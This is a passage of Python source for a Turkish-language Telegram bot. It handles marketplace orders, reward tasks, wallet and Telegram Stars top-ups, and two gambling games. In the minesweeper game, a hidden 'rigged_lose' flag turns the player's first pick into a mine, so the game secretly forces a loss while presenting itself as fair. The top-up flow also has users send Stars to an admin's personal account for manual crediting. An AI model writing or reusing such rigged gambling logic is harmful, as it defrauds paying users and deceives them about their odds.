    if user_id != owner_id and user_id not in admin_ids_set:
      safe_answer("Sadece satıcı veya admin onaylayabilir.", show_alert=True)
      return
    buyer_id = int(req.get("buyer_id"))
    l_id = req.get("listing_id")
    stars = int(req.get("stars") or 0)
    content = None
    if l_id and l_id in listings:
      content = pop_listing_stock(l_id)
    if not content:
      content = req.get("manual_content") or "Teslimat onaylandı. Satıcı ile iletişime geç."
    item = listings.get(l_id) if l_id and l_id in listings else {
      "title": req.get("title"),
      "category": req.get("category", "HESAP"),
      "user_id": owner_id,
      "owner_username": req.get("owner_username"),
    }
    deliver_listing_to_buyer(buyer_id, l_id or "-", item, content, stars, order_id=order_id)
    req["status"] = "delivered"
    pending_listing_orders[order_id] = req
    save_data()
    safe_answer("✅ Teslim edildi.")
    try:
      bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=(call.message.caption or "") + "\n\n**✅ TESLİM EDİLDİ**", parse_mode="Markdown")
    except Exception:
      try:
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=(call.message.text or "") + "\n\n**✅ TESLİM EDİLDİ**", parse_mode="Markdown")
      except Exception:
        pass
    return

  if call.data.startswith("seller_no_"):
    order_id = call.data.replace("seller_no_", "")
    req = pending_listing_orders.get(order_id)
    if not req:
      safe_answer("Sipariş yok.", show_alert=True)
      return
    owner_id = req.get("owner_id")
    if user_id != owner_id and user_id not in admin_ids_set:
      safe_answer("Sadece satıcı reddedebilir.", show_alert=True)
      return
    req["status"] = "await_admin"
    pending_listing_orders[order_id] = req
    save_data()
    am = types.InlineKeyboardMarkup(row_width=2)
    am.add(
      types.InlineKeyboardButton("✅ Admin Teslim", callback_data=f"seller_ok_{order_id}"),
      types.InlineKeyboardButton("❌ Admin Red", callback_data=f"admin_order_no_{order_id}"),
    )
    for admin_id in list(admin_ids_set):
      try:
        bot.send_message(
          admin_id,
          f"🚨 **Satıcı reddetti — admin kararı**\n"
          f"🆔 `{order_id}`\n"
          f"📌 {req.get('title')}\n"
          f"⭐ {req.get('stars')}\n"
          f"👤 Alıcı `{req.get('buyer_id')}` · Satıcı `{owner_id}`",
          reply_markup=am,
          parse_mode="Markdown",
        )
      except Exception:
        pass
    try:
      bot.send_message(int(req["buyer_id"]), "⏳ Satıcı reddetti; admin inceliyor.")
    except Exception:
      pass
    safe_answer("Adminlere iletildi.")
    return

  if call.data.startswith("admin_order_no_"):
    if user_id not in admin_ids_set:
      safe_answer("Yetkin yok.", show_alert=True)
      return
    order_id = call.data.replace("admin_order_no_", "")
    req = pending_listing_orders.pop(order_id, None)
    save_data()
    if req and req.get("buyer_id"):
      try:
        bot.send_message(
          int(req["buyer_id"]),
          f"❌ Sipariş iptal edildi (admin).\n🆔 `{order_id}`\nYıldızını satıcıdan geri isteyebilirsin.",
          parse_mode="Markdown",
        )
      except Exception:
        pass
    safe_answer("İptal.")
    return

  if call.data.startswith("approve_lbuy_") or call.data.startswith("reject_lbuy_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Bu işlem için yetkiniz yok!", show_alert=True)
      return

    parts = call.data.split("_")
    action = parts[0]
    p_id = parts[2]

    if p_id not in pending_listing_orders:
      safe_answer("❌ Bu talep bulunamadı veya daha önce işlenmiş!", show_alert=True)
      return

    req = pending_listing_orders[p_id]
    l_id = req['listing_id']
    buyer_id = req['buyer_id']
    buyer_username = req['buyer_username']
    buyer_link_username = req['buyer_link_username']
    buyer_phone = '-'

    if action == "approve":
      if l_id not in listings:
        safe_answer("❌ İlan artık sistemde mevcut değil!", show_alert=True)
        del pending_listing_orders[p_id]
        save_data()
        return

      item = listings[l_id]
      current_stock = int(item.get('stock', 1))
      owner_id = item.get('user_id')
      owner_username = item.get('owner_username')
      ilan_baslik = item.get('title', 'İlan')

      if current_stock > 1:
        item['stock'] = current_stock - 1
        stok_mesaji = f"📦 Kalan Stok: {item['stock']}"
      else:
        del listings[l_id]
        stok_mesaji = "📦 Stok tükendiği için ilan yayından kaldırıldı."

      del pending_listing_orders[p_id]
      save_data()
      safe_answer("✅ Satın alma talebi onaylandı ve stoktan düşüldü.")

      try:
        bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=call.message.caption + "\n\n**✅ ONAYLANDI**", parse_mode="Markdown")
      except:
        try:
          bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=call.message.text + "\n\n**✅ ONAYLANDI**", parse_mode="Markdown")
        except:
          pass

      aliciya_markup = types.InlineKeyboardMarkup()
      if owner_username:
        aliciya_markup.add(types.InlineKeyboardButton("💬 Satıcıya Git", url=f"https://t.me/{owner_username}"))

      aliciya_mesaj = f"✅ **İlan Satın Alma Talebiniz Onaylandı!**\n\n📌 **İlan:** {ilan_baslik}\n{stok_mesaji}\n👤 **İlan Sahibi:** @{owner_username if owner_username else owner_id}"
      try:
        bot.send_message(buyer_id, aliciya_mesaj, reply_markup=aliciya_markup if owner_username else None, parse_mode="Markdown")
      except: pass

      if owner_id:
        satici_markup = types.InlineKeyboardMarkup()
        if buyer_link_username:
          satici_markup.add(types.InlineKeyboardButton("💬 Alıcıya Git", url=f"https://t.me/{buyer_link_username}"))

        sahip_mesaji = f"🔔 **İlanınızdan Satış Gerçekleşti (Onaylandı)!**\n\n'{ilan_baslik}' başlıklı ilanınız {buyer_username} tarafından satın alındı.\n{stok_mesaji}"
        try: bot.send_message(owner_id, sahip_mesaji, reply_markup=satici_markup if buyer_link_username else None, parse_mode="Markdown")
        except: pass

    else:
      del pending_listing_orders[p_id]
      save_data()
      safe_answer("❌ Reddedildi.")
      try: bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=call.message.text + "\n\n**❌ REDDEDİLDİ**", parse_mode="Markdown")
      except: pass
      try: bot.send_message(buyer_id, "❌ İlan satın alma talebiniz reddedildi.")
      except: pass
    return

  if call.data.startswith("vip_approve_") or call.data.startswith("vip_reject_") or call.data.startswith("vip_ban_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return

    parts = call.data.split("_")
    action = parts[1]
    target_uid = int(parts[2])

    if action == "approve":
      try: bot.send_message(target_uid, "🎉 VIP siparişiniz onaylandı!")
      except: pass
      try: bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=call.message.caption + "\n\n**✅ ONAYLANDI**", parse_mode="Markdown")
      except: pass
      safe_answer("✅ VIP Onaylandı.")
    elif action == "reject":
      try: bot.send_message(target_uid, "❌ VIP siparişiniz reddedildi.")
      except: pass
      try: bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=call.message.caption + "\n\n**✅ REDDEDİLDİ**", parse_mode="Markdown")
      except: pass
      safe_answer("❌ VIP Reddedildi.")
    elif action == "ban":
      if target_uid in admin_ids_set:
        safe_answer("❌ Yönetici banlanamaz!", show_alert=True)
        return
      banned_users.add(target_uid)
      if target_uid in unban_requests_sent:
        unban_requests_sent.remove(target_uid)
      save_data()
      try: bot.send_message(target_uid, "❌ Sahte işlem nedeniyle kalıcı banlandınız.")
      except: pass
      try: bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=call.message.caption + "\n\n**🚫 BANLANDI**", parse_mode="Markdown")
      except: pass
      safe_answer("✅ Banlandı.")
      global_ban_announcement(target_uid, "sahte dekont/işlem beyan ettiği için")
    return

  elif call.data == "zeplin_cash_out":
    game = active_zeplin_games.get(user_id)
    if not game or game.get('game_over'):
      safe_answer("❌ Aktif bir Zeplin oyununuz bulunmuyor!", show_alert=True)
      return

    game['game_over'] = True
    bet = game['bet']
    mult = game['multiplier']
    winnings = bet * mult
    add_gamble_bal(user_id, winnings)
    update_gambling_profit(user_id, winnings - bet)
    save_data()

    safe_answer(f"💰 Parayı çektiniz! Kazanç: +{winnings:.2f} TL ({mult}x)", show_alert=True)
    try:
      bot.edit_message_text(f"🚀 **ZEPLİN - BAŞARIYLA ÇEKİLDİ!**\n\n📈 Çarpan: **{mult}x**\n💵 Kazanılan: **{winnings:.2f} TL**\n💳 Kumar Bakiyesi: **{get_gamble_bal(user_id):.2f} TL**", chat_id, call.message.message_id, parse_mode="Markdown")
    except:
      pass
    active_zeplin_games.pop(user_id, None)
    return

  elif call.data.startswith("mine_") or call.data == "cash_out":
    game = active_mines_games.get(user_id)
    if not game or game.get('game_over'):
      safe_answer("❌ Aktif bir oyununuz bulunmuyor!", show_alert=True)
      return

    bet = game['bet']
    mine_positions = game.get('mine_positions') or ([game['mine_pos']] if 'mine_pos' in game else [])
    revealed = game['revealed']
    safe_total = 9 - len(mine_positions)

    if call.data == "cash_out":
      if not revealed:
        safe_answer("❌ Henüz hiç kutu açmadınız!", show_alert=True)
        return
      multiplier = MINES_BASE_MULT + (len(revealed) * MINES_MULT_PER_STEP)
      winnings = bet * multiplier
      add_gamble_bal(user_id, winnings)
      update_gambling_profit(user_id, winnings - bet)
      game['game_over'] = True
      save_data()
      safe_answer(f"💰 Parayı çektiniz! Kazanç: +{winnings:.2f} TL", show_alert=True)
      try:
        bot.edit_message_text(
          f"💰 **OYUN BİTTİ (KASA ÇEKİLDİ)**\n\n🎯 Açılan: {len(revealed)}/{safe_total}\n💣 Mayın: {len(mine_positions)}\n💵 Kazanç: **{winnings:.2f} TL** ({multiplier:.2f}x)\n💳 Bakiye: **{user_balances[user_id]:.2f} TL**",
          chat_id, call.message.message_id, parse_mode="Markdown"
        )
      except:
        pass
      active_mines_games.pop(user_id, None)
      return

    pos = int(call.data.split("_")[1])
    if pos in revealed:
      safe_answer("⚠️ Bu kutu zaten açıldı!", show_alert=True)
      return

    if game.get("rigged_lose") and not revealed:
      if pos not in mine_positions:
        mine_positions = list(mine_positions) + [pos]
        game["mine_positions"] = mine_positions

    if pos in mine_positions:
      update_gambling_profit(user_id, -bet)
      game['game_over'] = True
      save_data()
      safe_answer("💥 Mayına bastınız, kaybettiniz!", show_alert=True)
      grid = []
      for i in range(9):
        if i in mine_positions:
          grid.append("💣")
        elif i in revealed:
          grid.append("⭐")
        else:
          grid.append("⬜")
      grid_txt = "\n".join(" ".join(grid[i:i+3]) for i in range(0, 9, 3))
      try:
        bot.edit_message_text(
          f"💥 **MAYINA BASTINIZ!**\n\n{grid_txt}\n\n😢 Kaybedilen: **-{bet:.2f} TL**\n💳 Bakiye: **{user_balances[user_id]:.2f} TL**",
          chat_id, call.message.message_id, parse_mode="Markdown"
        )
      except:
        pass
      active_mines_games.pop(user_id, None)
      return
    else:
      revealed.append(pos)
      current_mult = MINES_BASE_MULT + (len(revealed) * MINES_MULT_PER_STEP)
      potential_win = bet * current_mult

      if len(revealed) >= safe_total:
        add_gamble_bal(user_id, potential_win)
        update_gambling_profit(user_id, potential_win - bet)
        game['game_over'] = True
        save_data()
        safe_answer(f"🎉 Tüm güvenli kutular! +{potential_win:.2f} TL", show_alert=True)
        try:
          bot.edit_message_text(
            f"🎉 **TÜM GÜVENLİ KUTULAR AÇILDI!**\n\n💣 Mayın sayısı: {len(mine_positions)}\n💵 Kazanç: **{potential_win:.2f} TL** ({current_mult:.2f}x)\n💳 Bakiye: **{user_balances[user_id]:.2f} TL**",
            chat_id, call.message.message_id, parse_mode="Markdown"
          )
        except:
          pass
        active_mines_games.pop(user_id, None)
        return

      markup = types.InlineKeyboardMarkup(row_width=3)
      buttons = []
      for i in range(9):
        if i in revealed:
          buttons.append(types.InlineKeyboardButton("⭐", callback_data=f"mine_{i}"))
        else:
          buttons.append(types.InlineKeyboardButton("?", callback_data=f"mine_{i}"))
      markup.add(*buttons)
      markup.add(types.InlineKeyboardButton(f"💰 Çek ({potential_win:.2f} TL | {current_mult:.2f}x)", callback_data="cash_out"))
      safe_answer(f"✨ Güvenli! {current_mult:.2f}x | Kalan mayın riski yüksek")
      try:
        bot.edit_message_text(
          f"💣 **MAYIN TARLASI (ZOR)**\n\nBahis: {bet} TL | Mayın: **{len(mine_positions)}/9**\nAçılan: {len(revealed)}/{safe_total} | Çarpan: **{current_mult:.2f}x**\nOlası: **{potential_win:.2f} TL**\n\nDikkat: her adım riskli!",
          chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
        )
      except:
        pass
    return

  elif call.data == "menu_para_kazan":
    safe_answer()
    active = {k: v for k, v in earn_tasks.items() if v.get("active", True)}
    claimed = set(user_earn_claims.get(user_id, []))
    markup = types.InlineKeyboardMarkup(row_width=1)
    if not active:
      text = "💰 **PARA KAZAN**\n\n📭 Henüz görev yok. Admin yakında ekleyecek."
    else:
      text = "💰 **PARA KAZAN — Görevler**\n\nHer görev **bir kez** tamamlanır.\n"
      for tid, task in list(active.items())[:30]:
        reward = float(task.get("reward", DEFAULT_EARN_REWARD))
        title = task.get("title", "Görev")
        if tid in claimed:
          markup.add(types.InlineKeyboardButton(f"✅ {title} (+{reward:.0f} TL)", callback_data="earn_noop"))
        else:
          markup.add(types.InlineKeyboardButton(f"🎯 {title} → +{reward:.0f} TL", callback_data=f"earn_view_{tid}"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "earn_noop":
    safe_answer("Bu görevi zaten tamamladınız!", show_alert=True)
    return

  elif call.data.startswith("earn_view_"):
    safe_answer()
    tid = call.data[len("earn_view_"):]
    if tid not in earn_tasks or not earn_tasks[tid].get("active", True):
      safe_answer("Görev yok!", show_alert=True)
      return
    task = earn_tasks[tid]
    claimed = set(user_earn_claims.get(user_id, []))
    try:
      reward = float(task.get("reward", DEFAULT_EARN_REWARD))
    except Exception:
      reward = float(DEFAULT_EARN_REWARD)
    title = str(task.get("title", "Görev"))
    desc = str(task.get("desc", "-"))
    text = (
      f"🎯 {title}\n\n"
      f"📄 {desc}\n\n"
      f"💵 Ödül: +{reward:.0f} TL\n"
    )
    markup = types.InlineKeyboardMarkup(row_width=1)
    if tid in claimed:
      text += "\n✅ Bu görevi zaten aldınız."
    else:
      markup.add(types.InlineKeyboardButton(f"📸 Kanıt Gönder — +{reward:.0f} TL", callback_data=f"earn_claim_{tid}"))
    markup.add(types.InlineKeyboardButton("🔙 Görevler", callback_data="menu_para_kazan"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup)
    except Exception:
      try:
        bot.send_message(chat_id, text, reply_markup=markup)
      except Exception as e:
        log_error("earn_view", e)
        try:
          bot.send_message(chat_id, f"Görev: {title}\nÖdül: +{reward:.0f} TL", reply_markup=markup)
        except Exception:
          pass
    return

  elif call.data.startswith("earn_claim_"):
    safe_answer()
    tid = call.data[len("earn_claim_"):]
    if tid not in earn_tasks or not earn_tasks[tid].get("active", True):
      safe_answer("Görev bulunamadı!", show_alert=True)
      return
    claimed = user_earn_claims.get(user_id, [])
    if tid in claimed:
      safe_answer("Zaten aldınız!", show_alert=True)
      return
    for cid, c in list(pending_earn_claims.items()):
      try:
        if c.get("status") == "pending" and int(c.get("user_id", 0)) == int(user_id) and c.get("task_id") == tid:
          safe_answer("Bu görev için zaten kanıt gönderdin, onay bekleniyor.", show_alert=True)
          return
      except Exception:
        pass
    try:
      reward = float(earn_tasks[tid].get("reward", DEFAULT_EARN_REWARD))
    except Exception:
      reward = 5.0
    admin_temp_data[chat_id] = {"earn_proof_tid": tid, "earn_proof_reward": reward}
    user_states[chat_id] = "waiting_earn_proof"
    title = str(earn_tasks[tid].get("title", "Görev"))
    try:
      bot.send_message(
        chat_id,
        f"📸 Kanıt gerekli\n\n"
        f"🎯 {title}\n"
        f"💵 Ödül: +{reward:.0f} TL\n\n"
        f"Görevi yaptığının ekran görüntüsünü (foto) gönder.\n"
        f"Admin onaylarsa bakiye eklenir.\n"
        f"Admin 10 dk bakmazsa otomatik onaylanır.\n\n"
        f"İptal: /iptal"
      )
    except Exception as e:
      log_error("earn_claim_msg", e)
      bot.send_message(chat_id, "Kanıt için foto gönder. İptal: /iptal")
    return

  elif call.data.startswith("earn_approve_"):
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    cid = call.data.replace("earn_approve_", "")
    ok, msg = approve_earn_claim(cid, by_admin=True)
    safe_answer("Onaylandı" if ok else str(msg), show_alert=True)
    try:
      bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption="✅ Onaylandı")
    except Exception:
      bot.send_message(chat_id, "✅ Claim onaylandı: `" + str(cid) + "`", parse_mode="Markdown")
    return

  elif call.data.startswith("earn_reject_"):
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    cid = call.data.replace("earn_reject_", "")
    ok = reject_earn_claim(cid)
    safe_answer("Reddedildi" if ok else "İşlenemedi", show_alert=True)
    try:
      bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption="❌ Reddedildi")
    except Exception:
      bot.send_message(chat_id, "❌ Claim reddedildi: `" + str(cid) + "`", parse_mode="Markdown")
    return

  elif call.data == "admin_add_earn_task":
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    safe_answer()
    user_states[chat_id] = "waiting_earn_task_title"
    bot.send_message(chat_id, "💰 **Yeni Görev**\n\nGörev **başlığını** yazın:\nÖrn: `Kanala yorum at`", parse_mode="Markdown")
    return

  elif call.data == "admin_list_earn_tasks":
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    safe_answer()
    if not earn_tasks:
      bot.send_message(chat_id, "📭 Görev yok.")
      return
    markup = types.InlineKeyboardMarkup(row_width=1)
    text = f"📋 **Para Kazan Görevleri** ({len(earn_tasks)})\n\n"
    for tid, task in list(earn_tasks.items())[:40]:
      st = "🟢" if task.get("active", True) else "🔴"
      text += f"{st} `{tid}` | {task.get('title')} | {task.get('reward', 5)} TL\n"
      markup.add(types.InlineKeyboardButton(f"🗑️ Sil: {task.get('title', tid)[:20]}", callback_data=f"admin_del_earn_{tid}"))
    markup.add(types.InlineKeyboardButton("➕ Yeni Görev", callback_data="admin_add_earn_task"))
    markup.add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("admin_del_earn_"):
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    tid = call.data.split("_", 3)[3]
    if tid in earn_tasks:
      title = earn_tasks[tid].get("title", tid)
      del earn_tasks[tid]
      save_data()
      safe_answer(f"Silindi: {title}", show_alert=True)
      bot.send_message(chat_id, f"🗑️ Görev silindi: **{title}**", parse_mode="Markdown")
    else:
      safe_answer("Yok", show_alert=True)
    return

  elif call.data == "menu_bakiye":
    safe_answer()
    norm_bal = user_balances.get(user_id, 0.0)
    ref_bal = ref_balances.get(user_id, 0.0)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎲 ══ KUMAR BAKİYESİ YÜKLE ══", callback_data="star_gamble_topup_menu"))
    markup.add(types.InlineKeyboardButton("⭐ Yıldız ile Bakiye Yükle", callback_data="star_topup_menu"))
    markup.add(types.InlineKeyboardButton("📜 Bakiye Geçmişi", callback_data="view_balance_history"))
    markup.add(types.InlineKeyboardButton("🔄 Kullanıcıya Bakiye Transferi", callback_data="bakiye_transfer"))
    markup.add(types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu"))

    gbal = get_gamble_bal(user_id)
    bakiye_text = t(user_id, "balance_title", bal=norm_bal, ref=ref_bal) + ("\n🎲 Kumar Bakiyesi: **%.2f TL** (sadece şans oyunları)" % gbal)
    try:
      bot.edit_message_text(bakiye_text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      pass

  elif call.data == "bakiye_transfer":
    safe_answer()
    user_states[chat_id] = "waiting_transfer_id"
    bot.send_message(chat_id, "🔄 Bakiye göndermek istediğiniz kişinin **Telegram ID**'sini yazın:\n*(Not: Her transfer işleminden 1 TL işlem ücreti kesilir)*", parse_mode="Markdown")

  elif call.data == "star_topup_menu":
    safe_answer()
    # Bot üzerinden yıldız ödemesi kapalı — sadece admine gönder + onay
    rate = float(STAR_ADMIN_CLAIM_RATE)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("👤 Admine gönderdim — bakiye al", callback_data="star_admin_claim_menu"))
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_bakiye"))
    text = (
      "⭐ **Yıldız ile Bakiye Yükleme**\n\n"
      f"Yıldızları **bota değil**, doğrudan **{STAR_RECEIVER_USERNAME}** hesabına gönder.\n\n"
      f"💱 Admine kur: **1 ⭐ = {rate:.0f} TL**\n"
      f"   (karşılaştırma: normal/bot {STAR_TL_PER_STAR:.0f} TL/⭐)\n\n"
      f"Örnek: **1000 ⭐** → **{1000 * rate:.0f} TL**\n\n"
      "Akış:\n"
      f"1) Yıldızı **{STAR_RECEIVER_USERNAME}** hesabına at\n"
      "2) Buradan miktarı seç / yaz\n"
      "3) **1 ⭐** onay ödemesi yap\n"
      "4) Admin onaylayınca bakiyen eklenir"
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "star_auto_menu":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=2)
    row = []
    for s in STAR_QUICK:
      tl = s * STAR_TL_PER_STAR
      row.append(types.InlineKeyboardButton(
        f"⭐{s} = {tl:.0f} TL",
        callback_data=f"star_buy_{s}"
      ))
      if len(row) == 2:
        markup.add(*row)
        row = []
    if row:
      markup.add(*row)
    markup.add(types.InlineKeyboardButton("✏️ İstediğim kadar yıldız yaz", callback_data="star_custom"))
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="star_topup_menu"))
    text = (
      "⚡ **Otomatik Yıldız Ödeme**\n\n"
      f"💱 Kur: **1 ⭐ = {STAR_TL_PER_STAR:.0f} TL**\n"
      f"📦 Min: **{STAR_MIN}** · Max: **{STAR_MAX}** yıldız\n\n"
      "Paket seç veya istediğin kadar yaz.\n"
      "✅ Ödeme başarılı olunca bakiye **otomatik** eklenir."
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "star_admin_claim_menu":
    safe_answer()
    rate = float(STAR_ADMIN_CLAIM_RATE)
    markup = types.InlineKeyboardMarkup(row_width=2)
    row = []
    for s in STAR_QUICK:
      tl = s * rate
      row.append(types.InlineKeyboardButton(
        f"⭐{s} → {tl:.0f} TL",
        callback_data=f"star_claim_{s}"
      ))
      if len(row) == 2:
        markup.add(*row)
        row = []
    if row:
      markup.add(*row)
    markup.add(types.InlineKeyboardButton("✏️ Başka miktar yaz", callback_data="star_claim_custom"))
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="star_topup_menu"))
    text = (
      "👤 **Admine Yıldız Gönder**\n\n"
      f"1) Yıldızları **{STAR_RECEIVER_USERNAME}** hesabına gönder.\n"
      "2) Aşağıdan **gönderdiğin yıldız miktarını** seç.\n"
      "3) Bot sana **1 ⭐** onay faturası atar — öde.\n"
      "4) Admin onaylarsa bakiyen eklenir.\n\n"
      f"💱 Admine kur: **1 ⭐ = {rate:.0f} TL**\n"
      f"Örnek: 1000 ⭐ → **{1000 * rate:.0f} TL**\n\n"
      "⚠️ Sadece gerçekten gönderdiğin tutarı seç. Sahte talep reddedilir."
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "star_claim_custom":
    safe_answer()
    rate = float(STAR_ADMIN_CLAIM_RATE)
    user_states[chat_id] = "waiting_star_claim_amount"
    bot.send_message(
      chat_id,
      f"👤 **Kaç yıldız gönderdin?**\n\n"
      f"Alıcı: **{STAR_RECEIVER_USERNAME}**\n"
      f"💱 Admine kur: **1 ⭐ = {rate:.0f} TL**\n"
      f"📦 {STAR_MIN} – {STAR_MAX} arası yaz.\n\n"
      f"Örnek: `1000` → **{1000 * rate:.0f} TL** talep\n"
      f"Sonra **1 ⭐** onay ödemesi istenecek.\n"
      f"İptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data.startswith("star_claim_"):
    safe_answer()
    key = call.data.replace("star_claim_", "")
    try:
      claimed = int(key)
    except Exception:
      bot.send_message(chat_id, "❌ Geçersiz miktar.")
      return
    if claimed < STAR_MIN or claimed > STAR_MAX:
      bot.send_message(chat_id, f"❌ {STAR_MIN}–{STAR_MAX} yıldız arası seç.")
      return
    # Aynı anda birden fazla bekleyen claim engeli
    try:
      open_claims = [
        v for v in pending_star_payments.values()
        if int(v.get("user_id") or 0) == int(user_id)
        and v.get("status") == "pending"
        and v.get("type") == "admin_claim"
      ]
      if len(open_claims) >= 2:
        bot.send_message(chat_id, "❌ Zaten bekleyen admin onaylı talebin var. Önce o sonuçlansın.")
        return
    except Exception:
      pass
    send_star_claim_invoice(chat_id, user_id, claimed)

  elif call.data == "star_custom":
    safe_answer()
    user_states[chat_id] = "waiting_star_amount"
    bot.send_message(
      chat_id,
      f"⭐ **Kaç yıldız ödemek istiyorsun?**\n\n"
      f"Sadece sayı yaz (örn: `8` veya `50`)\n"
      f"💱 1 ⭐ = **{STAR_TL_PER_STAR:.0f} TL**\n"
      f"📦 {STAR_MIN} – {STAR_MAX} arası\n\n"
      f"Örnek: 8 yıldız → **{8 * STAR_TL_PER_STAR:.0f} TL** bakiye\n"
      f"İptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data.startswith("star_buy_"):
    safe_answer()
    key = call.data.replace("star_buy_", "")
    try:
      stars = int(key)
    except Exception:
      bot.send_message(chat_id, "❌ Geçersiz miktar.")
      return
    if stars < STAR_MIN or stars > STAR_MAX:
      bot.send_message(chat_id, f"❌ {STAR_MIN}–{STAR_MAX} yıldız arası seç.")
      return
    send_star_invoice(chat_id, user_id, stars)

  elif call.data == "star_gamble_topup_menu":
    safe_answer()
    gbal = get_gamble_bal(user_id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    row = []
    for s in STAR_GAMBLE_QUICK:
      gamt = s * STAR_GAMBLE_PER_STAR
      label = f"⭐{s} = {gamt:.0f} Kumar"
      if s == 100:
        label = "⭐100 = 1000 Kumar"
      row.append(types.InlineKeyboardButton(
        label,
        callback_data=f"star_gamble_buy_{s}"
      ))
      if len(row) == 2:
        markup.add(*row)
        row = []
    if row:
      markup.add(*row)
    markup.add(types.InlineKeyboardButton("✏️ İstediğim kadar yıldız yaz", callback_data="star_gamble_custom"))
    markup.add(
      types.InlineKeyboardButton("💳 Cüzdan", callback_data="menu_bakiye"),
      types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"),
    )
    text_msg = (
      f"🎲 **Kumar Bakiyesi Yükle (Yıldız)**\n\n"
      f"💱 Kur: **100 ⭐ = 1000 Kumar**\n"
      f"   (1 ⭐ = **{STAR_GAMBLE_PER_STAR:.0f}** kumar bakiyesi)\n"
      f"📦 Min: **{STAR_GAMBLE_MIN}** · Max: **{STAR_GAMBLE_MAX}** yıldız\n"
      f"🎲 Mevcut kumar bakiyen: **{gbal:.2f} TL**\n\n"
      f"Hazır paket seç veya istediğin kadar yaz.\n"
      f"Ödeme Telegram **Stars** ile yapılır.\n"
      f"✅ Ödeme başarılı olunca kumar bakiyesi otomatik eklenir."
    )
    try:
      bot.edit_message_text(text_msg, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, text_msg, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "star_gamble_custom":
    safe_answer()
    user_states[chat_id] = "waiting_star_gamble_amount"
    bot.send_message(
      chat_id,
      f"🎲 **Kaç yıldız ile kumar bakiyesi yüklensin?**\n\n"
      f"💱 **100 ⭐ = 1000 Kumar**\n"
      f"📦 {STAR_GAMBLE_MIN} – {STAR_GAMBLE_MAX} arası\n\n"
      f"Örnek: 100 yıldız → **1000** kumar bakiyesi\n"
      f"Örnek: 50 yıldız → **{50 * STAR_GAMBLE_PER_STAR:.0f}** kumar bakiyesi\n"
      f"Örnek: 200 yıldız → **{200 * STAR_GAMBLE_PER_STAR:.0f}** kumar bakiyesi\n\n"
      f"Sayı yaz veya /iptal",
      parse_mode="Markdown",
    )

  elif call.data.startswith("star_gamble_buy_"):
    safe_answer()
    key = call.data.replace("star_gamble_buy_", "")
    try:
      stars = int(key)
    except Exception:
      bot.send_message(chat_id, "❌ Geçersiz miktar.")
      return
    if stars < STAR_GAMBLE_MIN or stars > STAR_GAMBLE_MAX:
      bot.send_message(chat_id, f"❌ {STAR_GAMBLE_MIN}–{STAR_GAMBLE_MAX} yıldız arası seç.")
      return
    send_star_gamble_invoice(chat_id, user_id, stars)

  elif call.data == "menu_ilanlar":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_add_ilan = types.InlineKeyboardButton("➕ İlan Ekle", callback_data="ilan_add")
    btn_view_ilanlar = types.InlineKeyboardButton("📋 İlanları İncele", callback_data="ilan_list")
    btn_back = types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu")
    markup.add(btn_add_ilan, btn_view_ilanlar, btn_back)
    try: bot.edit_message_text(f"📢 **İlan ve Pazar Yeri**\n`{BOT_BUILD_TAG}`", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data == "ilan_add":
    safe_answer()
    admin_temp_data[chat_id] = {'new_listing': {}}
